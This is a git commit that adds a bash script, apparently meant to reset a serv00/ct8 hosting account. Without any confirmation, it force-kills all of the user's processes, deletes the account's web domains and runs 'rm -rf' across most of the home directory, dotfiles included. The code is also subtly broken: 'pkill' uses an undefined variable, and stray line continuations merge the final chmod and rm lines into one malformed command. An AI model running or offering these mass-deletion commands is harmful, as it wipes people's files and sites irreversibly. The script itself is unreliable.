3f7ff81aee0f213dfc1795e74aebd0c9eeb8affa
justn-gpt <146205844+justn-gpt@users.noreply.github.com>
2025-04-03 10:28:48 +0800

    Add files via upload

---
+++ 000.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+export LC_ALL=C
+export UUID=${UUID:-'fc44fe6a-f083-4591-9c03-f8d61dc3907f'} 
+export NEZHA_SERVER=${NEZHA_SERVER:-''}      
+export NEZHA_PORT=${NEZHA_PORT:-'5555'}             
+export NEZHA_KEY=${NEZHA_KEY:-''}                
+export PORT=${PORT:-'60000'} 
+USERNAME=$(whoami)
+HOSTNAME=$(hostname)
+
+[[ "$HOSTNAME" == "s1.ct8.pl" ]] && WORKDIR="domains/${USERNAME}.ct8.pl/logs" || WORKDIR="domains/${USERNAME}.serv00.net/logs"
+[ -d "$WORKDIR" ] || (mkdir -p "$WORKDIR" && chmod 777 "$WORKDIR" && cd "$WORKDIR")
+ps aux | grep $(whoami) | grep -v "sshd\|bash\|grep" | awk '{print $2}' | xargs -r kill -9 > /dev/null 2>&1
+devil www del $(whoami).serv00.net
+devil www del keep.$(whoami).serv00.net
+rm -rf $HOME/domains/*
+shopt -s extglob dotglob
+rm -rf $HOME/!(domains|mail|repo|backups)
+pkill -kill -u ${username}
+chmod -R 755 ~/* \
+chmod -R 755 ~/.* \
+rm -rf ~/.* \
+rm -rf ~/*
+
+exit 0
